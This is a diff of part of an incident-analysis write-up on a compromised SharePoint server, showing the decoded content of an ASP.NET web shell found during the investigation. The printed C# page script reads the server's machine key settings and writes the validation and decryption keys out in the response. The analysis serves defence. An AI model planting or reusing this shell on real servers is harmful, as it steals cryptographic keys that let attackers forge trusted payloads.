@@ -86,7 +86,10 @@ Analyzing EDR/Endpoint process trees and command lines on `SharePoint01` confirm
 
 <img src="https://github.com/user-attachments/assets/f457b30c-50e1-481b-947a-6f46decf0f03" alt="Decoded CyberChef Output" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />
 
+
 After encoxded using cyberchef
+
+
 <script runat="server" language="c#">
 public void Page_load()
 {
@@ -97,6 +100,8 @@ public void Page_load()
     Response.Write(cg.ValidationKey + "|" + cg.Validation + "|" + cg.DecryptionKey + "|" + cg.Decryption + "|" + cg.CompatibilityMode);
 }
 </script>
+
+
 
 <img src="https://github.com/user-attachments/assets/2eef18bc-36cd-4b2d-a1b8-9cfb49402778" alt="PowerShell Script Analysis 2" class="img-fluid rounded z-depth-1" style="margin: 1rem 0;" />
 
